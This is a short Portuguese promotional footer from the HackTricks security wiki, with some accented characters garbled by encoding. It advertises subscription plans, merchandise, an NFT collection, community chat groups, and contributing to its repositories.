* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou nos siga no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
